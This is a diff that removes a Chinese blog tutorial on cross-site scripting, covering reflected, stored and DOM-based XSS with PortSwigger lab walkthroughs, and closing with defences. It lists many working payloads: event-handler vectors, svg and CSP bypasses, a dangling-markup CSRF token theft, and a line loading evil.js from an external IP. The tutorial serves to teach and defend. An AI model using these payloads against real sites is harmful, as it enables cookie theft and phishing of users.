@@ -71,555 +71,6 @@
       <div class="outer">
         <section id="main">
   
-    <article id="post-Web/XSS/从0到1完全掌握 XSS" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2024/05/20/Web/XSS/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1%20XSS/" class="article-date">
-  <time class="dt-published" datetime="2024-05-19T16:00:00.000Z" itemprop="datePublished">2024-05-20</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a>►<a class="article-category-link" href="/categories/Web%E5%AE%89%E5%85%A8/XSS/">XSS</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2024/05/20/Web/XSS/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1%20XSS/">从0到1完全掌握XSS</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="从0到1完全掌握-XSS"><a href="#从0到1完全掌握-XSS" class="headerlink" title="从0到1完全掌握 XSS"></a>从0到1完全掌握 XSS</h1><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>本人二刷 XSS，在一刷的时候是以漏洞挖掘与漏洞利用为主，实际上完全对于实战根本没有概念，出去工作一段时间之后才算是拿出来应用。写这篇文章是打算再好好地梳理一遍 XSS。</p>
-<blockquote>
-<p>XSS 的本质是一种高级钓鱼手法。</p>
-</blockquote>
-<h2 id="0x02-什么是-XSS"><a href="#0x02-什么是-XSS" class="headerlink" title="0x02 什么是 XSS"></a>0x02 什么是 XSS</h2><p>XSS (Cross Site Scripting) 攻击全称<strong>跨站脚本攻击</strong>，是为不和<strong>层叠样式表</strong> (Cascading Style Sheets, CSS) 的缩写混淆，故将跨站脚本攻击缩写为 XSS。<br>XSS 是一种经常出现在 Web 应用中的计算机安全漏洞，它允许<strong>恶意 Web 用户</strong>将代码植入到提供给<strong>其它用户使用的页面</strong>中。</p>
-<ul>
-<li>XSS 的运行原理是将恶意的 script 脚本插入进 html&#x2F;css&#x2F;js 文件当中。代码长这样。</li>
-</ul>
-<p><img src="/.com//image-20250519114353-hnupv1m.png" alt="image"></p>
-<h2 id="0x03-XSS-的危害"><a href="#0x03-XSS-的危害" class="headerlink" title="0x03 XSS 的危害"></a>0x03 XSS 的危害</h2><p>前文我们说 XSS 本质上来说是一种钓鱼攻击，所以 XSS 的危害角度上也是以钓鱼能够造成的危害为主。</p>
-<h2 id="0x04-XSS-简单应用场景举例"><a href="#0x04-XSS-简单应用场景举例" class="headerlink" title="0x04 XSS 简单应用场景举例"></a>0x04 XSS 简单应用场景举例</h2><p>这里我想先介绍 XSS 的应用方法，如此一来讲起来不会太空洞，也能与下面的攻击手段有所呼应。以反射型 XSS 为例，原理图如下。</p>
-<p><img src="/.com//image-20250519114421-ekwxctq.png" alt="image">	​</p>
-<ul>
-<li>这里借用国光师傅的图片进行分析</li>
-</ul>
-<p><img src="/.com//image-20250519114457-xl4w7mw.png" alt="image"></p>
-<p>这是一个恶意的 QQ 空间钓鱼网站，我们在输入框内输入username%20<script>alert(document.cookie)</script>，再对登陆的按钮设置一个 href 到真正的 QQ 空间官网。然而当时用户输入的用户名密码已经被攻击者窃取了。</p>
-<hr>
-<h2 id="XSS-基本攻击手段"><a href="#XSS-基本攻击手段" class="headerlink" title="XSS 基本攻击手段"></a>XSS 基本攻击手段</h2><ul>
-<li>XSS 根据效果不同主要分为三种类型</li>
-<li>反射型 XSS，存储型 XSS，DOM 型 XSS</li>
-</ul>
-<p>危害性来说，存储型 XSS &gt;&gt; 反射型 XSS ~= DOM 型 XSS<br>我们接下来细讲一下这三种 XSS 的攻击手段。</p>
-<h3 id="1-反射型-XSS-及绕过手段"><a href="#1-反射型-XSS-及绕过手段" class="headerlink" title="1. 反射型 XSS 及绕过手段"></a>1. 反射型 XSS 及绕过手段</h3><h4 id="1-什么是反射型-XSS"><a href="#1-什么是反射型-XSS" class="headerlink" title="(1) 什么是反射型 XSS"></a>(1) 什么是反射型 XSS</h4><p>反射型 XSS，也叫非持久型 XSS，转瞬即逝。</p>
-<p>利用比较简单，比如在搜索框中，我记得当时 2020 年，b 站的搜索框还是存在 XSS 的，现在没有了。</p>
-<p>反射型 XSS 的 Payload 如下</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;script&gt;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/.com//image-20250519170804-2sjs41c.png" alt="image"></p>
-<p>效果如图所示</p>
-<p><img src="/.com//image-20250519170813-4tfx507.png" alt="image"></p>
-<h5 id="一、当大多数标签被禁止时的绕过"><a href="#一、当大多数标签被禁止时的绕过" class="headerlink" title="一、当大多数标签被禁止时的绕过"></a>一、当大多数标签被禁止时的绕过</h5><blockquote>
-<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked">Lab: Reflected XSS into HTML context with most tags and attributes blocked</a></p>
-</blockquote>
-<p>还是常规的 Fuzz 测试，在尝试 XSS 攻击之后，若失败了就进行 Fuzz 测试，因为无法排除是不是 WAF 过滤了部分关键字。</p>
-<p>探测出来 onresize 标签还是有效的，我们可以通过这一串 Payload 唤起打印服务</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body onresize=print()&gt;&quot; onload=this.style.width=&#x27;100px&#x27;&gt;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/.com//image-20250519171044-j7g2u17.png" alt="image"></p>
-<h5 id="二、当事件处理器与-href-被禁用时的绕过"><a href="#二、当事件处理器与-href-被禁用时的绕过" class="headerlink" title="二、当事件处理器与 href 被禁用时的绕过"></a>二、当事件处理器与 href 被禁用时的绕过</h5><ul>
-<li>老样子还是需要 Fuzz 的。如果渗透测试真正遇到这种情况的话，<code>svg</code>​标签的绕过方式还是主流。</li>
-</ul>
-<blockquote>
-<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-event-handlers-and-href-attributes-blocked">Lab: Reflected XSS with event handlers and href attributes blocked</a></p>
-</blockquote>
-<p>Payload</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;</span><br><span class="line">	&lt;a&gt;</span><br><span class="line">	&lt;animate attributeName=href</span><br><span class="line">     values=javascript:alert(1) /&gt;</span><br><span class="line">		&lt;text x=20 y=20&gt;Click me&lt;/text&gt;</span><br><span class="line">    &lt;/a&gt;</span><br></pre></td></tr></table></figure>
-
-<p>还有一些<code>svg</code>​标签的绕过手段</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;&lt;animatetransform onbegin=alert(1)&gt;</span><br></pre></td></tr></table></figure>
-
-<h5 id="三、对-script-进行闭合后构造-Payload"><a href="#三、对-script-进行闭合后构造-Payload" class="headerlink" title="三、对 script 进行闭合后构造 Payload"></a>三、对 script 进行闭合后构造 Payload</h5><p>对某些语句中的符号进行闭合。<br>有些 Web 后端代码会通过反斜杠转义，对很多单引号字符进行过滤，那么转义之后的代码就不能进行原 Payload 的作用。</p>
-<ul>
-<li>XSS Insert Into-&gt; JavaScript</li>
-</ul>
-<p>这种 Payload 可以是通过修改 Web 网站内部 JavaScript 来实现的，因为 JavaScript 本身就可以直接执行 alert 方法，无需使用<code>&lt;script&gt;</code>​标签。</p>
-<p>一般的 Payload</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;-alert(document.domain)-&#x27; </span><br><span class="line">&#x27;;alert(document.domain)//</span><br></pre></td></tr></table></figure>
-
-<h5 id="四、绕过-CSP-攻击"><a href="#四、绕过-CSP-攻击" class="headerlink" title="四、绕过 CSP 攻击"></a>四、绕过 CSP 攻击</h5><ul>
-<li>CSP：content security policy，比较严格的防御 XSS 手段。</li>
-</ul>
-<p>它一般在 HTTP 包里面长这样</p>
-<p><img src="/.com//image-20250519171202-sovbupc.png" alt="image"></p>
-<p>CSP通过这样的指令限制只能加载与页面本身相同来源的资源</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">script-src &#x27;self&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>通过下面的指令限制只能从指定域中加载资源</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">script-src https://scripts.normal-website.com</span><br></pre></td></tr></table></figure>
-
-<p>但是这种允许外部域的做法还是有风险的，如果攻击者可以向其传递恶意脚本也会遭到攻击的。而且应该也同时不信任来自 CDN 的资源，因为也有被投放的风险。CSP 还通过随机数和哈希值来指定可信资源。</p>
-<ul>
-<li>CSP 的指令指定一个随机数，加载脚本的标签也必须有相同的随机数。否则就不执行该脚本。并秉持一次性的原则，避免被猜解。</li>
-<li>CSP 指令可以指定脚本内容的哈希值。不匹配也是不会执行的。</li>
-</ul>
-<h6 id="绕过方式一-悬空标记攻击"><a href="#绕过方式一-悬空标记攻击" class="headerlink" title="绕过方式一 悬空标记攻击"></a>绕过方式一 悬空标记攻击</h6><ul>
-<li>这种和闭合语句的攻击差不多。</li>
-</ul>
-<p>虽然 CSP 通常可以阻止脚本，但是经常不会禁止加载图片资源，这就导致可以利用<code>img</code>​标签窃取 CSRF 令牌。</p>
-<p>有些浏览器比如 chrome，就有内置的悬空标记缓解功能，这个功能可以阻止包含某些字符的请求，比如换行符、未编码的新一行符或者尖括号。还有一些策略更为严格，可以防止所有形式的外部请求。</p>
-<p>但是还是可以通过注入一个 HTML 元素，点击该元素就会将该元素包含的所有内容发送到外部服务器的方式绕过这种策略，这里感觉有点像点击劫持攻击。</p>
-<blockquote>
-<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-very-strict-csp-with-dangling-markup-attack">Lab: Reflected XSS protected by very strict CSP, with dangling markup attack</a></p>
-</blockquote>
-<p>首先我们观察一下修改邮箱的表单要提交哪些信息</p>
-<p><img src="/.com//image-20250519171227-fw71hjh.png" alt="image"></p>
-<p>接着利用悬挂标记攻击将 CSRF Token 窃取出来，所以我们这样构造 Payload</p>
-<p><img src="/.com//image-20250519171235-02jsgfn.png" alt="image"></p>
-<p>再然后用 CSRF 盗用 token，再发包即可。</p>
-<h6 id="绕过方式二-对-CSP-限制不严格的情况下攻击"><a href="#绕过方式二-对-CSP-限制不严格的情况下攻击" class="headerlink" title="绕过方式二 对 CSP 限制不严格的情况下攻击"></a>绕过方式二 对 CSP 限制不严格的情况下攻击</h6><ul>
-<li>CSP 是有设置的，若<code>base-url</code>​为空的话，可以通过 token 值来添加新的 CSP 指令。</li>
-</ul>
-<p>Payload</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;&amp;token=;script-src-elem &#x27;unsafe-inline&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>我们使用<code>script-src-elem</code>​对 CSP 进行覆盖，从而进行 XSS 攻击。</p>
-<hr>
-<h3 id="2-存储型-XSS"><a href="#2-存储型-XSS" class="headerlink" title="2. 存储型 XSS"></a>2. 存储型 XSS</h3><p>存储型 XSS 是危害性最大的 XSS 了，它一般出现于评论留言功能处，大致的利用方法与绕过手段与反射型 XSS 很像，原理图如下。</p>
-<p><img src="/.com//image-20250519114421-ekwxctq.png" alt="image"></p>
-<ul>
-<li>如果执行起来也是插入进上下文标签当中，和之前反射型 XSS 的代码图类似，都是没有加任何的过滤手段，如图。</li>
-</ul>
-<p><img src="/.com//image-20250519171316-dariuk1.png" alt="image"></p>
-<p>我们在新增的评论中将 username 构造成 Payload</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>而这一条评论，又会被保存到数组或者是数据库当中(这个看 Web 程序的设计)，就造成了存储型 XSS。</p>
-<ul>
-<li>绕过手段不再逼逼，和反射型 XSS 是异曲同工。</li>
-</ul>
-<hr>
-<h3 id="3-DOM-型-XSS-重点"><a href="#3-DOM-型-XSS-重点" class="headerlink" title="3. DOM 型 XSS(重点!)"></a>3. DOM 型 XSS(重点!)</h3><p>DOM 型的 XSS 是基于文档对象模型 Document Objeet Model，DOM)的一种漏洞。说白了就是那些标签，比如<code>img</code>​，<code>input</code>​等这种类型的 DOM 节点标签而已，而 DOM 型 XSS 打的就是这些。</p>
-<blockquote>
-<p>我个人觉得 DOM 型 XSS 与反射型，存储型 XSS 的区别可谓不是一点半点，虽然有人把 DOM 型 XSS 归结到反射型 XSS 当中，但是我们看下去，会感受到些许不同。</p>
-</blockquote>
-<p>DOM 型 XSS 全部都是由前端进行触发的。所以我们平常如果挖洞，还是很考验代码审计的耐心的。</p>
-<ul>
-<li>我们下面讲几种常见的攻击方式，在这之前，我们先把可以利用的 DOM 节点，以及其 Payload 拉出来。Payload 摘自<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1838791">HACK 师傅的文章</a></li>
-</ul>
-<h4 id="一些常用的标签与属性"><a href="#一些常用的标签与属性" class="headerlink" title="一些常用的标签与属性"></a><strong>一些常用的标签与属性</strong></h4><p>下面我列举的标签大部分是可以自动触发 js 代码的，无需用户去交互，大部分情况下我们也是希望是自动触发而不是等用户去触发。</p>
-<h5 id="scirpt-标签"><a href="#scirpt-标签" class="headerlink" title="scirpt 标签"></a><strong>scirpt 标签</strong></h5><p>​<code>&lt;script&gt;</code>​标签用于定义客户端脚本，比如 JavaScript。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1);&lt;/script&gt;&lt;script&gt;alert(&quot;xss&quot;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<h5 id="img-标签"><a href="#img-标签" class="headerlink" title="img 标签"></a><strong>img 标签</strong></h5><p>​<code>&lt;img&gt;</code>​标签定义 HTML 页面中的图像。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=1 onerror=alert(1);&gt;&lt;img src=1 onerror=alert(&quot;xss&quot;);&gt;</span><br></pre></td></tr></table></figure>
-
-<h5 id="input-标签"><a href="#input-标签" class="headerlink" title="input 标签"></a><strong>input 标签</strong></h5><p>​<code>&lt;input&gt;</code>​标签规定了用户可以在其中输入数据的输入字段。<br>onfocus 事件在对象获得焦点时发生：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input onfocus=alert(1);&gt;</span><br></pre></td></tr></table></figure>
-
-<p>竞争焦点，从而触发 onblur 事件：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input onblur=alert(1) autofocus&gt;&lt;input autofocus&gt;</span><br></pre></td></tr></table></figure>
-
-<p>input 标签的 autofocus 属性规定当页面加载时<code>&lt;input&gt;</code>​元素应该自动获得焦点。可以通过 autofocus 属性自动执行本身的 focus 事件，这个向量是使焦点自动跳到输入元素上，触发焦点事件，无需用户去触发：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input onfocus=&quot;alert(1);&quot; autofocus&gt;</span><br></pre></td></tr></table></figure>
-
-<h5 id="details-标签"><a href="#details-标签" class="headerlink" title="details 标签"></a><strong>details 标签</strong></h5><p>​<code>&lt;details&gt;</code>​标签通过提供用户开启关闭的交互式控件，规定了用户可见的或者隐藏的需求的补充细节。ontoggle 事件规定了在用户打开或关闭<code>&lt;details&gt;</code>​元素时触发：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;details ontoggle=alert(1);&gt;</span><br></pre></td></tr></table></figure>
-
-<p>使用details 标签的 open 属性触发ontoggle事件，无需用户去点击即可触发：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;details open ontoggle=alert(1);&gt;</span><br></pre></td></tr></table></figure>
-
-<h5 id="svg-标签"><a href="#svg-标签" class="headerlink" title="svg 标签"></a><strong>svg 标签</strong></h5><p>​<code>&lt;svg&gt;</code>​标签用来在HTML页面中直接嵌入SVG 文件的代码。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload=alert(1);&gt;</span><br></pre></td></tr></table></figure>
-
-<h5 id="select-标签"><a href="#select-标签" class="headerlink" title="select 标签"></a><strong>select 标签</strong></h5><p>​<code>&lt;select&gt;</code>​标签用来创建下拉列表。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;select onfocus=alert(1)&gt;&lt;/select&gt;</span><br></pre></td></tr></table></figure>
-
-<p>通过autofocus属性规定当页面加载时元素应该自动获得焦点，这个向量是使焦点自动跳到输入元素上，触发焦点事件，无需用户去触发：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;select onfocus=alert(1) autofocus&gt;</span><br></pre></td></tr></table></figure>
-
-<h5 id="iframe-标签"><a href="#iframe-标签" class="headerlink" title="iframe 标签"></a><strong>iframe 标签</strong></h5><p>​<code>&lt;iframe&gt;</code>​标签会创建包含另外一个文档的内联框架。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe onload=alert(1);&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
-
-<h5 id="video-标签"><a href="#video-标签" class="headerlink" title="video 标签"></a><strong>video 标签</strong></h5><p>​<code>&lt;video&gt;</code>​标签定义视频，比如电影片段或其他视频流。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;video&gt;&lt;source onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
-
-<h5 id="audio-标签"><a href="#audio-标签" class="headerlink" title="audio 标签"></a><strong>audio 标签</strong></h5><p>​<code>&lt;audio&gt;</code>​标签定义声音，比如音乐或其他音频流。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;audio src=x  onerror=alert(1);&gt;</span><br></pre></td></tr></table></figure>
-
-<h5 id="body-标签"><a href="#body-标签" class="headerlink" title="body 标签"></a><strong>body 标签</strong></h5><p>​<code>&lt;body&gt;</code>​标签定义文档的主体。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body onload=alert(1);&gt;</span><br></pre></td></tr></table></figure>
-
-<p>onscroll 事件在元素滚动条在滚动时触发。我们可以利用换行符以及 autofocus，当用户滑动滚动条的时候自动触发，无需用户去点击触发：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;bodyonscroll=alert(1);&gt;&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;input autofocus&gt;</span><br></pre></td></tr></table></figure>
-
-<h5 id="textarea-标签"><a href="#textarea-标签" class="headerlink" title="textarea 标签"></a><strong>textarea 标签</strong></h5><p>​<code>&lt;textarea&gt;</code>​标签定义一个多行的文本输入控件。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;textarea onfocus=alert(1); autofocus&gt;</span><br></pre></td></tr></table></figure>
-
-<h5 id="keygen-标签"><a href="#keygen-标签" class="headerlink" title="keygen 标签"></a><strong>keygen 标签</strong></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;keygen autofocus onfocus=alert(1)&gt; //仅限火狐</span><br></pre></td></tr></table></figure>
-
-<h5 id="marquee-标签"><a href="#marquee-标签" class="headerlink" title="marquee 标签"></a><strong>marquee 标签</strong></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;marquee onstart=alert(1)&gt;&lt;/marquee&gt; //Chrome不行，火狐和IE都可以</span><br></pre></td></tr></table></figure>
-
-<h5 id="isindex-标签"><a href="#isindex-标签" class="headerlink" title="isindex 标签"></a><strong>isindex 标签</strong></h5><p>​<code>&lt;link&gt;</code>​标签定义文档与外部资源的关系。在无 CSP 的情况下才可以使用：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=import href=&quot;http://47.xxx.xxx.72/evil.js&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<h3 id="4-DOM-型-XSS-的利用"><a href="#4-DOM-型-XSS-的利用" class="headerlink" title="4. DOM 型 XSS 的利用"></a>4. DOM 型 XSS 的利用</h3><blockquote>
-<p>和前文说的一样，各种 js 中捣鼓</p>
-</blockquote>
-<h4 id="1-jQuery-中的-DOM-型-XSS"><a href="#1-jQuery-中的-DOM-型-XSS" class="headerlink" title="(1) jQuery 中的 DOM 型 XSS"></a>(1) jQuery 中的 DOM 型 XSS</h4><p>有问题的代码如下图所示</p>
-<p><img src="/.com//image-20250519171416-tmigybk.png" alt="image"></p>
-<p>若为进行任意过滤的时候 Payload</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=1 onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
-
-<h4 id="2-利用遗留下的测试代码"><a href="#2-利用遗留下的测试代码" class="headerlink" title="(2) 利用遗留下的测试代码"></a>(2) 利用遗留下的测试代码</h4><p>不多扯了，详见 <a target="_blank" rel="noopener" href="https://withd-raw.github.io/2022/05/05/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-07-XSS/#toc-heading-6">WebGoat代码审计-07-XSS 利用测试代码触发 DOM 型 XSS)</a></p>
-<hr>
-<h2 id="XSS-的实战应用"><a href="#XSS-的实战应用" class="headerlink" title="XSS 的实战应用"></a>XSS 的实战应用</h2><p>几种钓鱼，和 getshell<br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8459">XSS 实战攻击思路总结</a><br><a target="_blank" rel="noopener" href="https://www.hacking8.com/bug-web/Wordpress/Wordpress-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/%E4%BB%8Exss%E5%88%B0getshell--xss%E7%9A%84%E6%B7%B1%E5%B1%82%E6%AC%A1%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8E%A2%E8%AE%A8.html">从xss到getshell–xss的深层次利用与探讨</a></p>
-<hr>
-<h2 id="CSRF-和-XSS-的区别"><a href="#CSRF-和-XSS-的区别" class="headerlink" title="CSRF 和 XSS 的区别"></a>CSRF 和 XSS 的区别</h2><p>1、CSRF是<strong>跨站请求伪造;</strong>   XSS是<strong>跨域脚本攻击</strong>。<br>2、CSRF需要用户先<strong>登录网站A,获取cookie;</strong>   XSS<strong>不需要登录</strong>。<br>3、CSRF是利用网站<strong>A本身的漏洞</strong>,去请<strong>求网站A的api;</strong>   XSS是向网站<strong>A注入JS代码</strong>,然后<strong>执行JS里的代码</strong>,<strong>篡改网站A的内容</strong>。（XSS利用的是<strong>站点内的信任用户</strong>，而CSRF则是<strong>通过伪装来自受信任用户的请求</strong>来<strong>利用受信任的网站</strong>。你可以这么理解CSRF攻击：<strong>攻击者盗用了你的身份，以你的名义向第三方网站发送恶意请求</strong>。）</p>
-<hr>
-<h2 id="XSS-的防御"><a href="#XSS-的防御" class="headerlink" title="XSS 的防御"></a>XSS 的防御</h2><ul>
-<li>主要是两层：<br>一： 对输出端的<strong>数据进行编码</strong><br>二: <strong>验证输入</strong></li>
-</ul>
-<p>目前时间 2022 年 5 月，感觉 XSS 不像之前那么泛滥了。</p>
-<h3 id="1-对输出端的数据进行编码"><a href="#1-对输出端的数据进行编码" class="headerlink" title="1. 对输出端的数据进行编码"></a>1. 对输出端的数据进行编码</h3><p>1）将一些<strong>字符进行转义</strong>，例如<code>&lt;</code>​，<code>&gt;</code>​进行转义<br>2）白名单，通过一些<strong>标签限制</strong><br>3）不要把<strong>后端传进来的数据</strong>直接作为 <strong>HTML 渲染</strong>，进行处理</p>
-<h3 id="2-CSP-的应用"><a href="#2-CSP-的应用" class="headerlink" title="2. CSP 的应用"></a>2. CSP 的应用</h3><p>严格的 CSP 在 XSS 的防范中可以起到以下的作用：</p>
-<ul>
-<li><strong>禁止加载外域代码</strong>，防止复杂的攻击逻辑。</li>
-<li><strong>禁止内联脚本执行</strong>。</li>
-<li><strong>禁止外域提交</strong>，网站被攻击后，用户的数据不会泄露到外域。</li>
-<li>合理使用上报可以及时发现 XSS，利于尽快修复问题。</li>
-</ul>
-<h3 id="3-其他安全措施"><a href="#3-其他安全措施" class="headerlink" title="3. 其他安全措施"></a>3. 其他安全措施</h3><ul>
-<li><strong>HTTP-only Cookie: 禁止 JavaScript 读取某些敏感 Cookie</strong>，攻击者完成 <strong>XSS 注入</strong>后也无法<strong>窃取此 Cookie</strong>。</li>
-<li><strong>验证码：</strong> 防止脚本冒充用户提交危险操作。</li>
-</ul>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2024/05/20/Web/XSS/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1%20XSS/" data-id="cmawb0xv4000n747k0bc495fl" data-title="从0到1完全掌握XSS" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XSS/" rel="tag">XSS</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AE%89%E5%85%A8/" rel="tag">安全</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-Web/注入漏洞/SQL注入/sql注入总结" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
